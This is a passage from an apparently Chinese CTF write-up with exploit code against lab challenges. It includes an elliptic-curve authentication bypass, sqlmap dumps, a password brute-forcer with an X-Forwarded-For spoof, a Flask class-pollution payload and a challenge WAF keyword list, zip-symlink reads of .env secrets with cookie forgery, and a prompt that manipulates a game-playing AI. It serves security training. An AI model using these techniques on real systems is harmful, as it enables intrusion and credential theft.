        print(&#34;Invalid input format. Please enter as [p, a, b].&#34;)
        exit(1)

    print(&#34;Tell me your g which is on the curve: [gx, gy]&#34;)
    user_g = input()
    try:
        gx_in, gy_in = eval(user_g)
        user_point = (gx_in, gy_in)
    except Exception:
        print(&#34;Invalid input format. Please enter as [gx, gy].&#34;)
        exit(1)

    user_curve_obj = EllipticCurve(a_in, b_in, p_in, user_point)
    if not user_curve_obj.is_on_curve(user_point):
        print(&#34;The point G is not on the given curve.&#34;)
        exit(1)

    print(&#34;Curve and point accepted.&#34;)
    print(&#34;=&#34; * 60)
    print(&#34;Tell me your private_key: key&#34;)
    try:
        private_key = int(input())
    except Exception:
        print(&#34;Invalid private key format.&#34;)
        exit(1)

    if abs(private_key) &lt;= 1:
        print(&#34;Not secure key!&#34;)
        exit(1)

    from secret import flag

    user_pub = user_curve_obj.multiply(private_key, user_point)
    if user_pub == public_key:
        print(f&#34;Welcome back! Administrator. {flag}&#34;)
    else:
        print(&#34;Sorry, authentication failed.&#34;)
        exit(1)
```

椭圆曲线加密，构造恶意曲线，选择基点和私钥让 `user_pub` 等于 `public_key` 即可

```python
import re
from pwn import *
from ecdsa import curves

c = curves.NIST256p
CURVE_P = c.curve.p()
CURVE_A = c.curve.a()
CURVE_B = c.curve.b()
CURVE_N = c.order

HOST = &#34;127.0.0.1&#34;
PORT = 56313

def main():
    r = remote(HOST, PORT, timeout=10)
    banner = r.recvuntil(b&#34;Tell me your curve now: [p, a, b]\n&#34;, timeout=5).decode(errors=&#34;ignore&#34;)
    hexes = re.findall(r&#39;0x[0-9a-fA-F]&#43;&#39;, banner)

    gx_hex, gy_hex = hexes[0], hexes[1]
    print(f&#34;[&#43;] 解析到服务器公钥 P = ({gx_hex}, {gy_hex})&#34;)

    # 发送曲线参数 [p, a, b]
    curve_line = f&#34;[{CURVE_P}, {CURVE_A}, {CURVE_B}]\n&#34;
    print(&#34;[&#43;] 发送 curve:&#34;, curve_line.strip())
    r.send(curve_line.encode())

    r.recvuntil(b&#34;Tell me your g which is on the curve: [gx, gy]\n&#34;, timeout=5)
    # 发送 g = 服务器公钥（保留 hex 格式）
    g_line = f&#34;[{gx_hex}, {gy_hex}]\n&#34;
    print(&#34;[&#43;] 发送 g (server 公钥) :&#34;, g_line.strip())
    r.send(g_line.encode())

    r.recvuntil(b&#34;Tell me your private_key: key\n&#34;, timeout=5)
    # 发送私钥 n&#43;1（满足 abs(private_key)&gt;1 且 (n&#43;1)*P = P）
    private_key = CURVE_N &#43; 1
    print(&#34;[&#43;] 发送 private_key:&#34;, private_key)
    r.send(f&#34;{private_key}\n&#34;.encode())

    resp = r.recvall(timeout=5).decode(errors=&#34;ignore&#34;)
    print(f&#34;服务器返回：{resp}&#34;)
    r.close()

if __name__ == &#34;__main__&#34;:
    main()
```

![](imgs/image-20251012201251832.png)

## Web

### 题目名称 EZ_SQL

直接用 sqlmap 一把梭了

```bash
sqlmap -u http://127.0.0.1:54800 --data=&#39;id=1&#39;
sqlmap -u http://127.0.0.1:54800 --data=&#39;id=1&#39; -dbs
sqlmap -u http://127.0.0.1:54800 --data=&#39;id=1&#39; -D welcome --tables
sqlmap -u http://127.0.0.1:54800 --data=&#39;id=1&#39; -D welcome -T flag --dump
```

![](imgs/image-20251010160500868.png)

### 题目名称 EZ_Login（签到）

![](imgs/image-20251010170419139.png)

题目提示了弱密码，直接抓包写个脚本爆破即可得到管理员密码：`simple`

```python
import re
import requests
import sys

def get_captcha(session):
    url = &#34;http://127.0.0.1:60059/login&#34;

    res = session.get(url)
    # print(res.status_code)
    html_data = res.text
    captcha_list = re.findall(r&#34;/static/captcha_images/(.*?)\.png&#34;, html_data)
    
    return &#34;&#34;.join(captcha_list)

def login_func(session, captcha,passwd):
    print(f&#34;[&#43;] 当前尝试的密码为: {passwd}&#34;)
    url = &#34;http://127.0.0.1:60059/login&#34;
    data = {
        &#34;username&#34;: &#34;admin&#34;,
        &#34;password&#34;: passwd,
        &#34;captcha&#34;: captcha
    }
    res = session.post(url, data=data)
    # print(res.status_code)
    print(res.text)
    if &#34;错误&#34; not in res.text:
        print(f&#34;[&#43;] 管理员密码为: {passwd}&#34;)
        sys.exit(-1)

if __name__ == &#39;__main__&#39;:
    # 创建会话对象
    with requests.Session() as session:
        with open(&#34;rockyou.txt&#34;,&#39;r&#39;,encoding=&#39;utf-8&#39;,errors=&#39;ignore&#39;) as f:
            passwd_list = f.read().split()
        for passwd in passwd_list:
            if passwd[0] == &#39;s&#39;:
                captcha = get_captcha(session)
                print(f&#34;[&#43;] 获取到的验证码: {captcha}&#34;)
                login_func(session, captcha,passwd)
            else:
                continue
```

![](imgs/image-20251010165359711.png)

直接登录会提示你不是本地管理员

![](imgs/image-20251010170450033.png)

加个`X-Forwarded-For:127.0.0.1` 就能过检测

![](imgs/image-20251010170502876.png)

然后把返回的 jwt token 解个 base64 即可得到 flag

![](imgs/image-20251010170519701.png)

### 题目名称 Druid

题面信息如下：

&gt; 找到H2数据库的用户名，提交时请用TSCTF-J{}包裹

直接访问容器会得到如下页面

![](imgs/image-20251011144948687.png)

问了一下 AI，知道了 Druid 连接池是有后台的

![](imgs/image-20251011145001095.png)

试了一下第一个，得到如下页面

![](imgs/image-20251011145056075.png)

尝试了用户名 `admin` 和密码 `admin`，可以正常登录后台，然后查看数据源即可

![](imgs/image-20251011145246219.png)

`TSCTF-J{Y0v_S22_Dru1d}`

### 题目名称 EZ_PY

访问题目容器，可以看到如下页面

![](imgs/image-20251011171419296.png)

查看源代码，发现有提示

![](imgs/image-20251011171442274.png)

访问这个路由可以得到网站源码：

```python
import random
import string
from flask import Flask, request, jsonify, render_template_string
from functools import wraps
import jwt

app = Flask(__name__)
app.config[&#39;SECRET_KEY&#39;] = &#39;&#39;.join(random.sample(string.ascii_letters &#43; string.digits, 24))

# 用户数据库
users = {
    &#34;c1432&#34;: &#34;123456&#34;
}


def make_response(message: str, code: int = 200, data=None):
    &#34;&#34;&#34;
    Unified response format
    &#34;&#34;&#34;
    resp = {&#39;message&#39;: message}
    if data is not None:
        resp[&#39;data&#39;] = data
    return jsonify(resp), code


def waf_filter(input_str):
    if not input_str:
        return input_str
    input_str = str(input_str)
    dangerous_strings = [
        &#39;class&#39;, &#39;bases&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;globals&#39;, &#39;builtins&#39;, &#39;import&#39;, &#39;eval&#39;, 
        &#39;exec&#39;, &#39;open&#39;, &#39;file&#39;, &#39;read&#39;, &#39;write&#39;, &#39;os&#39;, &#39;subprocess&#39;, &#39;config&#39;, &#39;request&#39;, 
        &#39;session&#39;, &#39;g&#39;, &#39;url_for&#39;, &#39;get_flashed_messages&#39;,&#39;{%&#39;, &#39;%}&#39;, &#39;{#&#39;, &#39;#}&#39;, &#39;{{&#39;, &#39;}}&#39;
    ]
    for string in dangerous_strings:
        if string in input_str:
            return &#34;WAF blocked: Dangerous pattern detected&#34;
    filtered = input_str.replace(&#39;&lt;script&gt;&#39;, &#39;&#39;).replace(&#39;&lt;/script&gt;&#39;, &#39;&#39;)
    filtered = filtered.replace(&#39;javascript:&#39;, &#39;&#39;)
    filtered = filtered.replace(&#39;onload=&#39;, &#39;&#39;)
    filtered = filtered.replace(&#39;onerror=&#39;, &#39;&#39;)
    if &#34;hello&#34; in filtered:
        filtered = filtered.replace(&#34;hello&#34;, &#34;{{&#34;)
    if &#34;hacker&#34; in filtered:
        filtered = filtered.replace(&#34;hacker&#34;, &#34;}}&#34;)
    return filtered


class User:
    def __init__(self, role=&#39;user&#39;):
        self.username = None
        self.password = None
        self.role = role


def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, &#39;__getitem__&#39;):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get(&#39;Authorization&#39;)
        if not token:
            return make_response(&#39;Authorization token is required.&#39;, 401)
        try:
            token = token.split(&#34; &#34;)[1]         # 提取令牌，假设格式为 &#39;Bearer &lt;token&gt;&#39;
            data = jwt.decode(token, app.config[&#39;SECRET_KEY&#39;], algorithms=[&#34;HS256&#34;])
            current_user = data[&#39;user&#39;]
            role = data[&#39;role&#39;]
        except Exception as e:
            return make_response(f&#39;Invalid token: {str(e)}&#39;, 401)
        return f(current_user, role, *args, **kwargs)
    return decorated


@app.route(&#39;/register&#39;, methods=[&#39;POST&#39;])
def register():
    data = request.json
    if not data:
        return make_response(&#39;Username and password are required.&#39;, 400)
    user = User()
    merge(data, user)
    if not user.username or not user.password:
        return make_response(&#39;Username and password are required.&#39;, 400)
    users[user.username] = user.password
    return make_response(&#39;Registration successful.&#39;, 201)


@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
def login():
    auth = request.json
    if not auth:
        return make_response(&#39;Username and password are required.&#39;, 400)
    username = auth.get(&#39;username&#39;)
    password = auth.get(&#39;password&#39;)
    if not username or not password:
        return make_response(&#39;Username and password are required.&#39;, 400)
    if users.get(username) != password:
        return make_response(&#39;Invalid username or password.&#39;, 401)
    token = jwt.encode(
        {
            &#39;user&#39;: username,
            &#39;role&#39;: &#39;user&#39;
        },
        app.config[&#39;SECRET_KEY&#39;],
        algorithm=&#34;HS256&#34;
    )
    return jsonify({&#39;token&#39;: token})


@app.route(&#39;/protected&#39;, methods=[&#39;GET&#39;])
@token_required
def protected(current_user, role):
    if role != &#39;admin&#39;:
        return make_response(f&#39;Access denied: User {current_user} ({role}) does not have sufficient privileges.&#39;, 403)
    filtered_user = waf_filter(current_user)
    return render_template_string(f&#34;Hello, {filtered_user}! You have access to this protected resource.&#34;)


@app.route(&#39;/&#39;)
def index():
    with open(&#39;source/index.html&#39;, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
        return f.read()


@app.route(&#39;/register&#39;)
def register_page():
    with open(&#39;source/register.html&#39;, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
        return f.read()


@app.route(&#39;/success&#39;)
def success_page():
    with open(&#39;source/success.html&#39;, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
        return f.read()


@app.route(&#39;/source&#39;)
def show_source():
    with open(__file__, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
        return f.read()


if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;)
```

发现有 merge 函数，考察的是原型链污染，这里可以去污染 `SECRET_KEY`，也可以直接污染`__file__`

我这里是直接污染`__file__`为`/flag`，出题人很良心，没有改根目录下 flag 的文件名

```python
import requests
import json

target_url = &#34;http://127.0.0.1:51852&#34;

# 通过 globals 污染__file__
payload = {
    &#34;username&#34;: &#34;polluter2&#34;, 
    &#34;password&#34;: &#34;pass123&#34;,
    &#34;__init__&#34;: {
        &#34;__globals__&#34;: {
            &#34;__file__&#34;: &#34;/flag&#34;
        }
    }
}

res = requests.post(f&#34;{target_url}/register&#34;, json=payload)
print(res.text)
# {&#34;message&#34;:&#34;Registration successful.&#34;}
res = requests.get(f&#34;{target_url}/source&#34;)
print(res.text)
# TSCTF-J{y0u_c0mp1373d_7h3_py_pr0813m}
```

### 题目名称 FileSystem（二血）

题目给了源码还有如下提示：

&gt; 猜你想要：https://zh.wikipedia.org/wiki/符号链接

我们先审计代码，发现我们上传的文件会自动解压

![](imgs/image-20251012115054913.png)

因此这一步我们可以使用提示中的软链接来实现任意文件读取

但是在 entrypoint.sh 中发现 flag 所在的目录是八位随机字符组成的字符串

因此我们在读取 flag 前还需要先知道 flag 文件所在的目录

![](imgs/image-20251012120302251.png)

继续看代码，发现有个 /debug/files 的路由，可以通过 sessionId 查看任意用户上传的文件

![](imgs/image-20251012115219022.png)

继续跟进发现这个路由有如下校验：

![](imgs/image-20251012115203110.png)

在 server.js 中发现生成 cookie 的代码，需要用 SESSION_SECRET 进行签名，而 SESSION_SECRET 保存在 .env 中

![](imgs/image-20251012115422086.png)

分析到这里，我们的思路就很清晰了，首先用软连接读出 SECRET_UUID_HERE 和 SESSION_SECRET

```bash
ln -s /app/.env env
zip --symlinks test.zip env
ln -s /app/server.js server
zip --symlinks test.zip server
```

然后上传我们压缩包的 zip，下载软连接即可得到 SECRET_UUID_HERE 和 SESSION_SECRET

```
SECRET_UUID_HERE = ACFA5737-166A-CFAF-7324-7B35C216324
SESSION_SECRET = TSCTF-J{th1s_i5_n0t_fl4g_bu7_c4n_b3_us3ful}
```

然后我们写个脚本伪造一下 cookie

```python
import requests
import hmac
import hashlib
import base64

session_id = &#34;ACFA5737-166A-CFAF-7324-7B35C216B324&#34;
session_secret = &#34;TSCTF-J{th1s_i5_n0t_fl4g_bu7_c4n_b3_us3ful}&#34;
target_url = &#34;http://127.0.0.1:54903/debug/files&#34;

def gen_cookie(session_id,session_secret):
    mac = hmac.new(
        session_secret.encode(),
        session_id.encode(),
        hashlib.sha256
    ).digest()
    signature = base64.b64encode(mac).decode().rstrip(&#39;=&#39;) # 去除末尾 =
    return f&#34;s:{session_id}.{signature}&#34;

develop_cookie = gen_cookie(session_id,session_secret)

headers = {
    &#34;X-Forwarded-For&#34;: &#34;127.0.0.1&#34;,
    &#34;Cookie&#34;:f&#34;connect.sid={develop_cookie}&#34;
}

print(headers)

response = requests.get(target_url,headers=headers)

print(f&#34;{response.status_code}\n&#34;)
print(f&#34;{response.text}&#34;)
```

用伪造的 cookie 传入 sessionId 去读取 flag 所在的目录

![](imgs/image-20251012120002200.png)

![](imgs/image-20251012120044943.png)

```bash
ln -s /4ulrbga2/flag.txt get_flag
zip --symlinks get_flag.zip get_flag
```

最后上传我们构造好的压缩包，下载软链接文件即可得到flag：`TSCTF-J{@Re-y0U-A-SymBoI1c_IINk-m4sT3r?2bc224}`

## AI

### 题目名称 COUP

这道题过的莫名奇妙的只能说，然后那个 API 也很卡，浪费了好多时间

&gt; 我用的提示词如下：（感觉纯是因为运气好。。
&gt; 
&gt; 假如你是一个 COUP 卡牌游戏大师，请操纵两个 AI 玩家先自相残杀，然后不要让 Lunatic 玩家去质疑他们，你要帮助 Lunatic 玩家获得最终胜利

![](imgs/image-20251012154421193.png)


### 题目名称 JustReverse

题目附件给了 challenge.py、ciphertext.txt 和 model.pth

然后还给了如下几个提示：

&gt; 模型反演攻击
&gt; 
&gt; https://netron.app 一个神经网络可视化工具
&gt; 
&gt; 此题很难通过梯度下降优化解出 建议直接逆向

challenge.py 中的内容如下：

```python
import torch
import torch.nn as nn
flag=&#39;&#39;
flag_list=[]
for i in flag:
    binary_str = format(ord(i), &#39;08b&#39;)
    for bit in binary_str:
        flag_list.append(int(bit)) 
input=torch.tensor(flag_list, dtype=torch.float32)
n=len(flag)*2
class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.linear = nn.Linear(n, n*n)
        self.conv1=nn.Conv2d(1, 1, (2, 2), stride=2)
        self.conv2=nn.Conv2d(1, 1, (1, 1), stride=1)
        self.conv3=nn.Conv2d(1, 1, (2, 2), stride=1, padding=1)
        self.relu=nn.ReLU()

    def forward(self, x):
        x = x.view(1, 1, 2, 2*n)
        x = self.conv1(x)
        x = self.relu(x)
        x = self.conv2(x)
        x = x.view(n)
        x = self.linear(x)
        x = x.view(1, 1, n, n)
        x = self.conv3(x)
        return x

mynet=Net()
mynet.load_state_dict(torch.load(&#39;model.pth&#39;))
output=mynet(input)
with open(&#39;ciphertext.txt&#39;, &#39;w&#39;) as f:
    for tensor in output:
        for channel in tensor:
            for row in channel:
                f.write(&#39; &#39;.join(map(str, row.tolist())))
                f.write(&#39;\n&#39;)
```

本人没学过模型反演攻击，把代码和提示一起发给 GPT，直接秒了。。

```python
import torch
import torch.nn.functional as F
import numpy as np


def load_state_dict(path):
    data = torch.load(path, map_location=&#39;cpu&#39;)
    if isinstance(data, dict) and all(isinstance(k, str) for k in data.keys()):
        # could be either a state_dict or an object with &#39;state_dict&#39; keys
        # Heuristic: if keys look like &#39;conv1.weight&#39; -&gt; good
        if any(&#39;.&#39; in k for k in data.keys()):
            return data
    # if it&#39;s a model object with state_dict method
    if hasattr(data, &#39;state_dict&#39;):
        return data.state_dict()
    raise RuntimeError(&#34;Unrecognized model.pth format; expected state_dict or model object with .state_dict()&#34;)


def read_ciphertext(path):
    rows = []
    with open(path, &#39;r&#39;) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split()
            rows.append([float(x) for x in parts])
    arr = np.array(rows, dtype=np.float64)
    return arr


def build_conv3_matrix(conv3_w_tensor, n):
    # conv3_w_tensor: torch tensor shape (1,1,2,2)
    # We&#39;ll build matrix A3 of shape ((n&#43;1)^2, n*n) such that vec(O_without_bias) = A3 @ vec(M)
    conv3_w = conv3_w_tensor.clone().detach()
    out_h = n &#43; 1
    out_w = n &#43; 1
    total_out = out_h * out_w
    total_in = n * n
    A = np.zeros((total_out, total_in), dtype=np.float64)
    # prepare kernel tensor
    kernel = conv3_w.unsqueeze(0) if False else conv3_w  # shape (1,1,2,2)
    for idx in range(total_in):
        M = torch.zeros((1,1,n,n), dtype=torch.float32)
        r = idx // n
        c = idx % n
        M[0,0,r,c] = 1.0
        # conv2d with padding=1, bias=0
        out = F.conv2d(M, conv3_w, bias=None, padding=1, stride=1)
        out_np = out.detach().numpy().reshape(-1)  # length (n&#43;1)*(n&#43;1)
        A[:, idx] = out_np
    return A  # numpy array

def main():
    sd = load_state_dict(&#39;model.pth&#39;)

    # extract weights (robust to keys ordering)
    def get_tensor(k):
        if k in sd:
            return sd[k].cpu().float()
        # maybe keys contain &#39;module.&#39; prefix (from DataParallel)
        for kk in sd:
            if kk.endswith(k):
                return sd[kk].cpu().float()
        raise KeyError(f&#34;Cannot find weight key ending with &#39;{k}&#39; in state_dict keys.&#34;)

    conv1_w = get_tensor(&#39;conv1.weight&#39;)   # shape (1,1,2,2)
    conv1_b = get_tensor(&#39;conv1.bias&#39;)     # shape (1,)
    conv2_w = get_tensor(&#39;conv2.weight&#39;)   # shape (1,1,1,1)
    conv2_b = get_tensor(&#39;conv2.bias&#39;)     # shape (1,)
    linear_w = get_tensor(&#39;linear.weight&#39;) # shape (n*n, n)
    linear_b = get_tensor(&#39;linear.bias&#39;)   # shape (n*n,)
    conv3_w = get_tensor(&#39;conv3.weight&#39;)   # shape (1,1,2,2)
    conv3_b = get_tensor(&#39;conv3.bias&#39;)     # shape (1,)

    # load ciphertext
    out_arr = read_ciphertext(&#39;ciphertext.txt&#39;)  # shape (n&#43;1, n&#43;1)
    out_h, out_w = out_arr.shape
    if out_h != out_w:
        print(&#34;Warning: ciphertext not square, continuing.&#34;)
    out_size = out_h
    n = out_h - 1
    print(f&#34;Detected n = {n} (so flag length L = n/2 = {n//2})&#34;)
    L = n // 2
    if n % 2 != 0:
        print(&#34;Warning: n not divisible by 2. Proceeding anyway.&#34;)

    # convert everything to numpy for linear algebra
    vecO = out_arr.reshape(-1).astype(np.float64)
    conv3_bias = float(conv3_b.item())
    # build A3
    print(&#34;Building conv3 linear mapping matrix A3 (this may take a moment)...&#34;)
    A3 = build_conv3_matrix(conv3_w, n)  # shape ((n&#43;1)^2, n*n)
    # solve A3 @ vecM = vecO - conv3_bias
    rhs = vecO - conv3_bias
    # use least squares
    print(&#34;Solving for vec(M) via least squares ...&#34;)
    vecM_sol, residuals, rank, s = np.linalg.lstsq(A3, rhs, rcond=None)
    # round small numerical noise
    vecM = np.round(vecM_sol, decimals=6)
    # If entries should be integers, round to nearest integer
    # but linear layer outputs could be floats; we&#39;ll keep floats but try to match numerically
    M = vecM.reshape((n, n))
    print(&#34;Recovered matrix M (shape {}x{}).&#34;.format(n, n))

    # now inverse linear: linear_w @ z &#43; linear_b = vecM  -&gt; solve for z (length n)
    W = linear_w.detach().numpy().astype(np.float64)  # shape (n*n, n)
    b_lin = linear_b.detach().numpy().astype(np.float64)  # shape (n*n,)
    rhs2 = vecM - b_lin
    print(&#34;Solving linear layer for z (length n)...&#34;)
    # Solve W @ z = rhs2
    z_sol, residuals2, rank2, s2 = np.linalg.lstsq(W, rhs2, rcond=None)
    z = np.array(z_sol).reshape(-1)
    # If solution should be near integers or small floats, round a bit
    # Next conv2: conv2 is 1x1 conv: x&#39; = conv2_w * z &#43; conv2_b
    # so conv1_out = (z - conv2_b) / conv2_w
    w2 = float(conv2_w.view(-1).item())
    b2 = float(conv2_b.view(-1).item())
    if abs(w2) &lt; 1e-12:
        raise RuntimeError(&#34;conv2 weight too small, cannot invert.&#34;)
    conv1_out = (z - b2) / w2
    # conv1_out should be length n
    # Now invert conv1 per 2x2 block by brute forcing 16 possibilities per block (bits are 0/1)
    conv1_k = conv1_w.detach().numpy().reshape(4)  # flattened 4 elements in order [0,0],[0,1],[1,0],[1,1] maybe
    conv1_bval = float(conv1_b.view(-1).item())
    # Need to be careful about indexing order: conv1 kernel shape (1,1,2,2)
    # When we flattened as above, we must use matching order to compute k dot block
    k00 = float(conv1_w[0,0,0,0].item())
    k01 = float(conv1_w[0,0,0,1].item())
    k10 = float(conv1_w[0,0,1,0].item())
    k11 = float(conv1_w[0,0,1,1].item())
    kvals = np.array([k00, k01, k10, k11], dtype=np.float64)

    total_input_bits = 4 * n  # equals 8 * L
    bits = np.zeros(total_input_bits, dtype=np.int64)

    tol = 1e-3
    ambiguous_blocks = 0

    print(&#34;Inverting conv1 blocks by brute-force over 16 binary combinations per 2x2 block...&#34;)
    for t in range(n):
        target = conv1_out[t]
        found = None
        candidates = []
        # 4 positions map to indices:
        # row0 col 2*t  -&gt; bit index = 2*t
        # row0 col 2*t&#43;1 -&gt; bit index = 2*t&#43;1
        # row1 col 2*t  -&gt; bit index = 2*n &#43; 2*t
        # row1 col 2*t&#43;1 -&gt; bit index = 2*n &#43; 2*t&#43;1
        idxs = [2*t, 2*t&#43;1, 2*n &#43; 2*t, 2*n &#43; 2*t&#43;1]
        for comb in range(16):
            b0 = (comb &gt;&gt; 3) &amp; 1
            b1 = (comb &gt;&gt; 2) &amp; 1
            b2_ = (comb &gt;&gt; 1) &amp; 1
            b3 = comb &amp; 1
            vec = np.array([b0, b1, b2_, b3], dtype=np.float64)
            pred = float(np.dot(kvals, vec) &#43; conv1_bval)
            if abs(pred - target) &lt; tol:
                candidates.append((comb, pred))
        if len(candidates) == 0:
            # try relaxed tol
            for comb in range(16):
                b0 = (comb &gt;&gt; 3) &amp; 1
                b1 = (comb &gt;&gt; 2) &amp; 1
                b2_ = (comb &gt;&gt; 1) &amp; 1
                b3 = comb &amp; 1
                vec = np.array([b0, b1, b2_, b3], dtype=np.float64)
                pred = float(np.dot(kvals, vec) &#43; conv1_bval)
                # pick closest
                # we&#39;ll compute distance and choose min later
            # choose minimum-distance combination
            best_comb = None
            best_err = float(&#39;inf&#39;)
            for comb in range(16):
                b0 = (comb &gt;&gt; 3) &amp; 1
                b1 = (comb &gt;&gt; 2) &amp; 1
                b2_ = (comb &gt;&gt; 1) &amp; 1
                b3 = comb &amp; 1
                vec = np.array([b0, b1, b2_, b3], dtype=np.float64)
                pred = float(np.dot(kvals, vec) &#43; conv1_bval)
                err = abs(pred - target)
                if err &lt; best_err:
                    best_err = err
                    best_comb = comb
            # accept best even if error not tiny
            comb = best_comb
            b0 = (comb &gt;&gt; 3) &amp; 1
            b1 = (comb &gt;&gt; 2) &amp; 1
            b2_ = (comb &gt;&gt; 1) &amp; 1
            b3 = comb &amp; 1
            bits[idxs[0]] = b0
            bits[idxs[1]] = b1
            bits[idxs[2]] = b2_
            bits[idxs[3]] = b3
            ambiguous_blocks &#43;= 1
        else:
            # if multiple candidates, pick the one with minimal abs(pred-target)
            best = min(candidates, key=lambda x: abs(x[1]-target))
            comb = best[0]
            b0 = (comb &gt;&gt; 3) &amp; 1
            b1 = (comb &gt;&gt; 2) &amp; 1
            b2_ = (comb &gt;&gt; 1) &amp; 1
            b3 = comb &amp; 1
            bits[idxs[0]] = b0
            bits[idxs[1]] = b1
            bits[idxs[2]] = b2_
            bits[idxs[3]] = b3

    if ambiguous_blocks &gt; 0:
        print(f&#34;Warning: {ambiguous_blocks} blocks had to use nearest-match (relaxed).&#34;)

    # Now bits is length 8*L, reconstruct bytes (format(ord(i),&#39;08b&#39;) used MSB-first)
    bytes_list = []
    for i in range(L):
        byte_bits = bits[8*i:8*i&#43;8]
        s = &#39;&#39;.join(str(int(b)) for b in byte_bits)
        val = int(s, 2)
        bytes_list.append(val)
    try:
        flag = &#39;&#39;.join(chr(b) for b in bytes_list)
    except:
        flag = &#39;&#39;.join((chr(b) if 32 &lt;= b &lt; 127 else &#39;?&#39;) for b in bytes_list)

    print(f&#34;Recovered bytes: {bytes_list}&#34;)
    print(f&#34;Recovered_string: {flag}&#34;)
    # Recovered_string: TSCTF-J{NotReverseButInverse}

if __name__ == &#39;__main__&#39;:
    main()

```

![](imgs/image-20251012212828758.png)

### 题目名称 Rabbit-Duck-Puzzle（三血）

题目附件给了 challenge.py、gift.py、model.pkl、还有下面这张 origin_image.png

![](imgs/image-20251012220735741.png)

```python
# challenge.py
import numpy as np
from PIL import Image
from skimage.feature import hog
from skimage.color import rgb2gray
from skimage.transform import resize
import joblib
import socket
import base64
import io
import os

if os.path.exists(&#34;/flag&#34;):
    with open(&#34;/flag&#34;, &#34;r&#34;) as f:
        FLAG = f.read().strip()
else:
    FLAG = &#34;TSCTF-J{this_is_a_placeholder_flag}&#34;

MODEL = joblib.load(&#34;model.pkl&#34;)

IMG_SIZE = (256, 256)
HOG_PARAMS = {
    &#34;orientations&#34;: 9,
    &#34;pixels_per_cell&#34;: (16, 16),
    &#34;cells_per_block&#34;: (2, 2),
    &#34;block_norm&#34;: &#34;L2-Hys&#34;
}


def extract_hog_features(image):
    img = np.array(image)
    img = resize(img, IMG_SIZE)
    gray = rgb2gray(img)
    features = hog(gray, **HOG_PARAMS)
    return features.reshape(1, -1)


def check(your_image):
    origin_image = Image.open(&#34;./origin_image.png&#34;)
    origin_image_array = np.array(origin_image)
    your_image_array = np.array(your_image)

    if your_image_array.shape != (256, 256, 3):
        return False, &#34;😎 Cabelis&#39;s eyes are sharp... They are different images!&#34;

    average_diff = np.mean(
        np.abs(origin_image_array.astype(np.int32) - your_image_array.astype(np.int32)).astype(np.uint8)
    )
    max_diff = np.max(
        np.abs(origin_image_array.astype(np.int32) - your_image_array.astype(np.int32)).astype(np.uint8)
    )

    if average_diff &gt; 25 or max_diff &gt; 50:
        return False, &#34;😎 Cabelis&#39;s eyes are sharp... They are different images!&#34;

    return True, &#34;😉 Cabelis is satisfied with your image!&#34;


def evaluate(your_image):
    clf = MODEL
    class_names = [&#39;Duck&#39;, &#39;Rabbit&#39;]

    features = extract_hog_features(your_image)

    predicted_class = clf.predict(features)[0]
    probabilities = clf.predict_proba(features)[0]

    result = {
        &#34;predicted_class&#34;: class_names[predicted_class],
        &#34;probabilities&#34;: dict(zip(class_names, probabilities))
    }
    return result


def handle_client(conn):
    try:
        # 接收数据
        adv = b&#34;&#34;
        while True:
            temp = conn.recv(4096)
            adv &#43;= temp
            if adv.endswith(b&#34;Merak^^&#34;):
                adv = adv[:-7]  # 去掉结束符
                break

        if not adv:
            conn.sendall(&#34;😅 No data received.&#34;.encode())
            return

        # 解码base64
        try:
            img_bytes = base64.b64decode(adv)
            img = Image.open(io.BytesIO(img_bytes)).convert(&#34;RGB&#34;)
        except Exception as e:
            conn.sendall(f&#34;😅 Invalid image data. {e}&#34;.encode())
            return

        # 执行check
        passed, msg = check(img)
        conn.sendall(msg.encode() &#43; b&#34;\n&#34;)
        
        if not passed:
            return

        # 执行evaluate
        result = evaluate(img)
        response = f&#34;Predicted class: {result[&#39;predicted_class&#39;]}\n&#34;
        response &#43;= f&#34;Probabilities: {result[&#39;probabilities&#39;]}\n&#34;

        if result[&#34;predicted_class&#34;] == &#34;Rabbit&#34;:
            response &#43;= f&#34;🥳 Your gift: {FLAG}&#34;
        else:
            response &#43;= f&#34;🤔 Try again...&#34;

        conn.sendall(response.encode() &#43; b&#34;\n&#34;)

    except Exception as e:
        conn.sendall(f&#34;🤯 Error: {e}&#34;.encode())
    finally:
        conn.close()


def main():
    HOST = &#34;0.0.0.0&#34;
    PORT = 5000
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f&#34;[*] Server listening on {HOST}:{PORT}&#34;)

    while True:
        conn, addr = server.accept()
        print(f&#34;[*] Accepted connection from {addr}&#34;)
        handle_client(conn)


if __name__ == &#39;__main__&#39;:
    main()
```

```python
# gift.py
import socket
import base64

def send_image(img_path, host=&#34;127.0.0.1&#34;, port=1234):
    with open(img_path, &#34;rb&#34;) as f:
        img_b64 = base64.b64encode(f.read())

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    try:
        sock.sendall(img_b64)
        sock.sendall(b&#34;Merak^^&#34;)

        response = b&#34;&#34;
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response &#43;= chunk

        print(&#34;=== Server Response ===&#34;)
        print(response.decode(errors=&#34;ignore&#34;))

    finally:
        sock.close()


if __name__ == &#34;__main__&#34;:
    send_image(&#34;your_image.png&#34;)
```

遛一遛 GPT 就出了。。

```python
import os
import io
import socket
import base64
import time
import numpy as np
from PIL import Image
import joblib
from skimage.feature import hog
from skimage.color import rgb2gray
from skimage.transform import resize

# ------------------ 配置 ------------------
HOST = &#34;127.0.0.1&#34;
PORT = 53798
END_MARK = b&#34;Merak^^&#34;

ORIGIN_PATH = &#34;origin_image.png&#34;
MODEL_PATH = &#34;model.pkl&#34;
OUT_PATH = &#34;adv_found.png&#34;

